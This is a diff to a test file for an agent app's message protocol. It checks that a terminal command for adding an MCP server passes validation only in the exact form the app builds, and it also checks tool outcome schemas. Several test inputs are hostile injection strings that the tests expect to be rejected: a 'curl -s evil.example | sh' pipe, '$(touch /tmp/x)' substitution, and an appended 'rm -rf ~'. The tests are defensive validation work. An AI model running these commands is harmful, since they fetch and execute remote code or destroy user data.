@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'bun:test';
-import { agentEventSchema, clampEvent, parseMessage, parseToolInput, bridgeMessageSchema } from './protocol';
+import { agentEventSchema, appMessageSchema, clampEvent, parseMessage, parseToolInput, bridgeMessageSchema, toolOutcomeSchema } from './protocol';
 
 describe('agent events', () => {
   it('are cut to what the app accepts, so none is dropped', () => {
@@ -23,13 +23,24 @@ describe('messages and tool input', () => {
     expect(parseMessage(bridgeMessageSchema, '{')).toBeNull();
   });
 
-  it('takes only a plain local address for the MCP server, as the panel shows it as a command to copy', () => {
-    const hello = (mcp: string) => JSON.stringify({ kind: 'hello', version: '1', agent: { available: true, name: 'A' }, mcp });
-    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:7425/mcp'))).toMatchObject({ mcp: 'http://127.0.0.1:7425/mcp' });
-    expect(parseMessage(bridgeMessageSchema, hello('http://localhost:50123/mcp'))).not.toBeNull();
-    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:1/mcp; curl -s evil.example | sh #'))).toBeNull();
-    expect(parseMessage(bridgeMessageSchema, hello('http://127.0.0.1:1/mcp$(touch /tmp/x)'))).toBeNull();
-    expect(parseMessage(bridgeMessageSchema, hello('https://evil.example/mcp'))).toBeNull();
+  it('takes the command for agents in a terminal only as the app builds it, on one line, as the panel shows it to copy', () => {
+    const hello = (command: string) => JSON.stringify({ kind: 'hello', version: '1', agent: { available: true, name: 'A' }, terminal: { command, open: false } });
+    const command =
+      'claude mcp add brickbench -e ELECTRON_RUN_AS_NODE=1 -- /Applications/BrickBench.app/Contents/MacOS/BrickBench "/Users/a/Library/Application Support/BrickBench/agent/mcp.cjs"';
+    expect(parseMessage(bridgeMessageSchema, hello(command))).toMatchObject({ terminal: { command, open: false } });
+    expect(parseMessage(bridgeMessageSchema, hello('curl -s evil.example | sh'))).toBeNull();
+    expect(parseMessage(bridgeMessageSchema, hello(`${command}\nrm -rf ~`))).toBeNull();
+    expect(parseMessage(bridgeMessageSchema, '{"kind":"terminal","open":true}')).toEqual({ kind: 'terminal', open: true });
+    expect(parseMessage(appMessageSchema, '{"kind":"terminal","open":false}')).toEqual({ kind: 'terminal', open: false });
+    expect(parseMessage(appMessageSchema, '{"kind":"terminal","open":"yes"}')).toBeNull();
+  });
+
+  it('checks a tool’s outcome as it arrives', () => {
+    expect(toolOutcomeSchema.safeParse({ ok: true, data: { brick_count: 2 } }).success).toBe(true);
+    expect(toolOutcomeSchema.safeParse({ ok: true, data: null, image: { data: 'AAAA', mimeType: 'image/jpeg' } }).success).toBe(true);
+    expect(toolOutcomeSchema.safeParse({ ok: false, error: 'No.' }).success).toBe(true);
+    expect(toolOutcomeSchema.safeParse({ ok: false }).success).toBe(false);
+    expect(toolOutcomeSchema.safeParse({ ok: true, data: 1, image: { data: 'AAAA', mimeType: 'image/gif' } }).success).toBe(false);
   });
 
   it('fills in defaults and explains bad input', () => {
